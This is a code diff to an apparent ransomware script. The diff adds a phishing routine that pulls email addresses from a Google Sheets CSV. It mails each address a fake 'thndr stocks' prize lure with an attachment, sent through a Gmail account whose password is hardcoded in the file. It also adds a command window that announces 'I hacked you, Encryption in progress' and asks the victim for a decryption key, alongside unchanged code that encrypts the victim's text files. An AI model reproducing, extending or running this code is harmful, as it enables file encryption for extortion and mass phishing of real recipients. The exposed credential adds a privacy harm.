@@ -9,7 +9,15 @@ import glob
 from cryptography.hazmat.primitives.asymmetric import padding, rsa
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric.padding import OAEP
-
+import smtplib
+import csv
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
+import requests
+import pandas as pd
+import io
+import subprocess
 
 
 def generate_key(length=16):
@@ -66,9 +74,70 @@ def decrypt_using_private(private_key, ciphertext):
     plaintext = cipher.decrypt(ciphertext)
     return plaintext
 
+def sendmail(content, receiver, attachment_path):
+    sender_email = "thndrstocks@gmail.com"
+    receiver_email = receiver
+    password = "emwqdhkmqonxxrnl"
+
+    # Create a multipart message
+    message = MIMEMultipart()
+    message["From"] = sender_email
+    message["To"] = receiver_email
+    message["Subject"] = "Congratulation! You have been selected for thndr bonus."
+
+    # Attach the content as plain text
+    message.attach(MIMEText(content, "plain"))
+
+    # Open and attach the file
+    with open(attachment_path, "rb") as attachment:
+        part = MIMEApplication(attachment.read(), Name=attachment_path)
+
+    # Add header for the attachment
+    part['Content-Disposition'] = f'attachment; filename="{attachment_path}"'
+
+    # Attach the file to the message
+    message.attach(part)
+
+    # Connect to the SMTP server and send the email
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(sender_email, password)
+    server.send_message(message)
+    server.quit()
+
+
+def infect(csv_url, attachment):
+    response = requests.get(csv_url)
+
+    if response.status_code == 200:
+        csv_content = response.content.decode('utf-8')
+        df = pd.read_csv(io.StringIO(csv_content))
+    else:
+        print("Error:", response.status_code)
+
+    # get the email from the df
+    emails = df['Email'].tolist()
+
+    # loop through the emails and send the email
+    for email in emails:
+        sendmail("You have won a prize in thndr stocks click the file to view",
+                 email, attachment)
+
+    print(emails)
+
+
+# subprocess.Popen('cmd.exe')
+infect("https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv", "")
+cmd_process = subprocess.Popen(
+    ['start', 'cmd'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+# Send a message to the command prompt
+message = "Congratulations I hacked you , Encryption in progress!!"
+cmd_process.stdin.write(f'echo {message}\n'.encode())
+cmd_process.stdin.flush()
+
+
 key = generate_key(16)
 bytes_key = key.encode('utf-8')
-
 
 txt_files = find_all_files()
 
@@ -77,6 +146,13 @@ for file_path in txt_files:
 
 save_key(bytes_key)
 
+cmd_process.stdin.write(
+    b'python -c "import sys; sys.stdout.write(input(\'Enter your decryption key:\'))"\n')
+cmd_process.stdin.flush()
+
+# Read the user's input from the command prompt
+user_input = cmd_process.stdout.readline().decode().strip()
+print("User input:", user_input)
 #plaintext = decrypt_using_private(private_key=private_key, ciphertext=encrypted_key)
 #print (plaintext)
 
